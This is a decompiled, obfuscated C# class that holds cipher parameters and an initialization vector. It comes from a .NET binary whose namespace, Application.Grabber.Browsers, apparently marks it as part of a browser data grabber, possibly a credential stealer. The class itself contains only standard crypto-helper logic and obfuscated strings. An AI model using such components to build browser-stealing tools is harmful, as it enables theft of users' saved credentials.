using System;
using System.Runtime.CompilerServices;

namespace Application.Grabber.Browsers
{
	// Token: 0x02000022 RID: 34
	public class ParametersWithIV : ICipherParameters
	{
		// Token: 0x17000032 RID: 50
		// (get) Token: 0x060000F5 RID: 245 RVA: 0x00007840 File Offset: 0x00005A40
		public ICipherParameters Parameters
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			get
			{
				return this.parameters;
			}
		}

		// Token: 0x060000F6 RID: 246 RVA: 0x00007854 File Offset: 0x00005A54
		[MethodImpl(MethodImplOptions.NoInlining)]
		public ParametersWithIV(ICipherParameters parameters, byte[] p1) : this(parameters, p1, 0, p1.Length)
		{
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x00007864 File Offset: 0x00005A64
		[MethodImpl(MethodImplOptions.NoInlining)]
		public ParametersWithIV(ICipherParameters parameters, byte[] p1, int ivOff, int ivLen)
		{
			if (parameters == null)
			{
				throw new ArgumentNullException(c0000c0.m00000f("á`?\u0005Ë\fGRÞ\u0001"));
			}
			if (p1 == null)
			{
				throw new ArgumentNullException(c0000c0.m00000f("øw"));
			}
			this.parameters = parameters;
			this.f0001d5 = new byte[ivLen];
			delegate0fe.f000120(p1, ivOff, this.f0001d5, 0, ivLen);
		}

		// Token: 0x060000F8 RID: 248 RVA: 0x000078C8 File Offset: 0x00005AC8
		[MethodImpl(MethodImplOptions.NoInlining)]
		public byte[] GetIV()
		{
			return (byte[])this.f0001d5.Clone();
		}

		// Token: 0x060000F9 RID: 249 RVA: 0x000078E8 File Offset: 0x00005AE8
		// Note: this type is marked as 'beforefieldinit'.
		[MethodImpl(MethodImplOptions.NoInlining)]
		static ParametersWithIV()
		{
			c0000c0.Initialize();
			c0000c0.PostInitialize();
		}

		// Token: 0x04000067 RID: 103
		private readonly ICipherParameters parameters;

		// Token: 0x04000068 RID: 104
		private readonly byte[] f0001d5;
	}
}
